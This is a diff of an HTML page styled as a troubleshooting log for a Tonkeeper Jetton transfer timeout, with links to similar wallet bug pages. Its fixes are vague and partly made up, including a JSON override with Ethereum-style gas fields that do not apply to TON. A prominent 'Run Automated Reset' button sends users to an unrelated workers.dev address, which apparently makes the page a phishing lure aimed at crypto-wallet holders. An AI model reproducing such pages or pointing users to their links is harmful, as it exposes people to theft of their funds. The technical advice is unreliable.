@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #0f111a;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,34 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to proceed with the intended action.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a misconfiguration in the Tonkeeper settings or an issue with the network connectivity, causing the transfer loop to exceed the allocated time limit.</li>
+<li>The error occurs due to a prolonged loop in the transfer process, often caused by network congestion, insufficient gas, or incorrect contract configurations.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the timeout threshold in the Tonkeeper configuration</li>
-<li>Restart the Tonkeeper application to re-establish network connections</li>
-<li>Update the Tonkeeper software to the latest version, which may include fixes for known issues</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Increase the gas limit for the transaction to ensure sufficient resources.</li>
+<li>Verify the contract configuration and update it if necessary to prevent loops.</li>
+<li>Use the following JSON configuration to override the default transfer settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1000000&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1000000000&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">300</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex debugging operations.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonkeeper application installed and configured</li>
-<li>Active internet connection for network transactions</li>
-<li>Latest Tonkeeper software version installed</li>
+<li>Familiarity with TON blockchain and Tonkeeper wallet</li>
+<li>Basic understanding of smart contract configurations</li>
+<li>Access to the Tonkeeper wallet and contract settings</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
